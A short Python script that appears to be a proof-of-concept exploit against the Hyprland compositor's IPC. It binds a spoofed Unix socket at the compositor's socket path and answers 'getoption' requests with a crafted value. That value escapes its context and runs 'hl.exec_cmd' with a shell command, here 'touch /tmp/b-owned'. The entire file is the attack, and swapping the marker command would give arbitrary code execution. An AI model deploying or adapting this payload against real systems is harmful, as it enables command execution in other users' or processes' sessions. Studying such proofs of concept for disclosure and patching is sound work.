#!/usr/bin/env python3
import socket, os, json
A_UID = os.getuid()
SOCK = f"/run/user/{A_UID}/hypr/fake_0/.socket.sock"
PAYLOAD = 'false } }) hl.exec_cmd("touch /tmp/b-owned") --'
try:
    os.unlink(SOCK)
except FileNotFoundError:
    pass
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.bind(SOCK); s.listen(16)
print("Listening on", SOCK, flush=True)
while True:
    c, _ = s.accept()
    req = c.recv(4096).decode("utf-8", "replace")
    print("Got request:", repr(req), flush=True)
    if "getoption" in req:
        c.sendall(json.dumps({"option": req.strip(), "bool": PAYLOAD, "set": True}).encode())
    else:
        c.sendall(b"ok")
    c.close()
